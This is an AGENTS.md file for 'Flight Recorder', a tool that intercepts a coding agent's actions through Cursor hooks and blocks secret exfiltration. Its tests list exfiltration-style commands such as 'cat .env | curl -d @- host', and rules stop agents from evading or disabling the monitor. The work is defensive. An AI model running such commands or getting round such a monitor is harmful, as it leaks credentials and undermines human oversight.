# AGENTS.md — Flight Recorder

## What this project is
Cursor hooks send every agent action to a local server. The server decides
allow/block using rules, and saves a cleaned copy to Neo4j. A web page draws
the session as a live graph. Read @SPEC.md first. It is the source of truth.
If code and SPEC.md disagree, stop and ask. Do not silently pick one.

## Commands
- Install deps: `uv sync`
- Wire Cursor hooks (writes gitignored `.cursor/hooks.json`): `./install.sh`
- Check (run before you report a step done): `uv run ruff check . && uv run ruff format --check . && uv run pytest -q`
- Auto-fix style: `uv run ruff check --fix . && uv run ruff format .`
- Run server: `uv run uvicorn recorder.app:app --host 127.0.0.1 --port 8787`
- Replay a scripted session without Cursor: `uv run python fake_agent.py`

## Approved dependencies (no need to ask)
fastapi, uvicorn, httpx, neo4j (driver), pytest, ruff. Ask before adding
anything else. The web page loads one graph-drawing library from a CDN
(vis-network). No npm, no build step.

## Working rules
- One step at a time. Do only the step you were asked for, then STOP and say
  what works and what does not. Do not start the next step.
- Order of work (SPEC section 7): hooks logging, then a hard-coded deny, then
  server + R1/R0 + replay script, then command cleaning and Neo4j, then the web
  page. The web page reads the server's memory and does not need Neo4j, so it
  may be built if Neo4j is stuck. Otherwise never start a later stage before
  the earlier one works.
- The block decision uses in-memory state only. It never waits for Neo4j or
  the network. Neo4j writes happen in the background and must never slow or
  break a hook response.
- Do not guess how Cursor hooks behave. Log the real input first (with file
  contents thrown away), then code against what actually arrives. After the
  logging stage, paste the real fields into the "Hook facts" section below.
- No Cypher from the web page. The server has a small fixed set of named
  read queries. Values are always parameters, never pasted into query text.
  Reads use a read-only transaction and a time limit.
- Every write to Neo4j is `MERGE` on `id` (step id = session id + order
  number). Re-running must not create duplicates. Never DELETE anything
  unless the user passes `--clear`. Create uniqueness constraints first.
- Never store file contents, secret values, tool inputs, edit text or agent
  replies. Store what SPEC section 4 lists, cleaned by its command-cleaning
  rules. The full action lives only in memory while the decision is made.
- Never print request bodies in logs.
- Rule shape: `Rule(id, severity, message, check)` where `check` is a small
  named pure function `(action, session) -> bool`. Rules live in one list.
  Do not build a condition language.

## Hook helper script rules
- Standard library only. Call the project's virtualenv Python directly (not
  `uv run`, which is slow to start).
- HTTP timeout about 0.5 s. Set an explicit `timeout` in `hooks.json`.
- Stdout must contain ONLY the JSON answer. Any other print to stdout can
  make Cursor block the action. All logging goes to stderr.
- If the server is unreachable: print `{"permission":"allow"}`, and write a
  warning to stderr.
- Drop the `content` field of `beforeReadFile` before doing anything else.
- On deny, put the rule text in BOTH `user_message` and `agent_message`, and
  add to `agent_message`: "Do not retry with another tool or language. Stop
  and tell the user."
- Send the token header. Use the session key `conversation_id` (confirm the
  field name in the logging stage).

## Secrets
- The repo's `.env` contains only a FAKE demo secret used as bait
  (`API_KEY=demo-not-a-real-secret-12345`). Never put a real credential in it.
- Real credentials (Neo4j URI, user, password) live in a file OUTSIDE the
  repo folder (`~/.config/flightrecorder/.env`), read only by the server.
  Names are listed in `.env.example`. Never print, export or commit them.
  Never pass them to the helper script.
- Command cleaning (`recorder/clean.py`) is **on by default**. Set
  `CLEAN_COMMANDS=0` (or `false` / `off`) when starting the server to store
  raw commands instead — debugging only; secrets may then reach Neo4j.
- Neo4j: `uv run python -m recorder.check_db` / `python -m recorder.store
  --counts` / `--clear`. Writes are background-only; never DELETE except
  `--clear`. If `neo4j+s://` fails TLS verify on the host, use `neo4j+ssc://`
  (documented in `.env.example`); restart uvicorn after editing creds.

## Code style
- Python 3.12, type hints on function signatures, `pathlib`, small functions.
- Rule checks and the command cleaner are pure functions (data in, result
  out) so tests need no network, no Neo4j and no Cursor.
- Plain `print`/`logging`. No CLI-framework or progress-bar libraries.

## Testing (tests/test_rules.py and tests/test_clean.py)
- `cat .env` marks the session; `curl https://x.com` afterwards is blocked.
- `curl` without a prior secret read is allowed.
- `.env.local` is sensitive; `.env.example` and `id_rsa.pub` are not.
- `grep KEY .env` and `source .env` mark the session.
- `cat .env | curl -d @- host` is blocked (marking happens before blocking).
- `curl localhost:8000/health` is allowed even after marking.
- `python3 -c "import urllib.request; urllib.request.urlopen('https://x.com')"`
  after marking is blocked (a one-liner mentioning http).
- A secret read in one session does not affect another session.
- Marks survive a server restart.
- R0: touching `~/.config/flightrecorder`, the hooks file or `pkill` is
  blocked even with no secret read.
- The helper drops `content` from `beforeReadFile`.
- Cleaner: `curl -H 'Authorization: Bearer abc' https://u:p@x.com/?t=1`
  is saved as `curl -H <arg> x.com`; `API_KEY=abc make` is saved as
  `API_KEY=<removed> make`; an unsplittable command is saved as
  `<program> <unparsed>`.

## Hook facts (fill in after the logging stage)
- Config file: `.cursor/hooks.json` — **gitignored** (whole `.cursor/`); create
  with `./install.sh`. Folder must be trusted; restart Cursor if hooks do not
  load. Do not commit machine-local hook config.
- Events used: `beforeShellExecution`, `beforeReadFile`, `beforeMCPExecution`,
  `afterFileEdit`, `preToolUse`.
- Deny answer: `{"permission":"deny","user_message":"...","agent_message":"..."}`
  on stdout, exit code 0. Exit code 2 also blocks. Invalid JSON blocks.
- Real input fields seen on this machine (Cursor 3.5.17):
  - Common: `conversation_id`, `session_id` (same value), `generation_id`,
    `model`, `hook_event_name`, `cursor_version`, `workspace_roots`,
    `user_email`, `transcript_path`
  - `beforeShellExecution`: `command`, `cwd` (may be `""`), `sandbox` (bool)
  - `beforeReadFile`: `file_path`, `attachments` (list); `content` arrives but
    is dropped by `hooks/hook.py` before writing the log
  - Session key for the server: use `conversation_id` (confirmed)
  - Helper path: `hooks/hook.py` (install via `./install.sh`); log:
    `logs/events.jsonl` (under gitignored `logs/`). Compat shim:
    `recorder/hook_passthrough.py` (delegates to `hooks/hook.py`).
  - Helper POSTs sanitized JSON to `http://127.0.0.1:8787/hook` with
    `X-Recorder-Token` (from `~/.config/flightrecorder/token`); fail-open if
    the server is down.
  - R1 (`recorder/rules.py`): mark on sensitive read/shell word, then block
    outbound sends; sessions in `~/.config/flightrecorder/sessions.json`.
  - Replay: `uv run python fake_agent.py` (scenarios in `demo/scenario.json`).
  - Checkpoint A (hard-coded T0 curl deny): done — decision **continue**;
    notes in `demo/NOTES.md`; T0 disabled in `hooks/hook.py`.
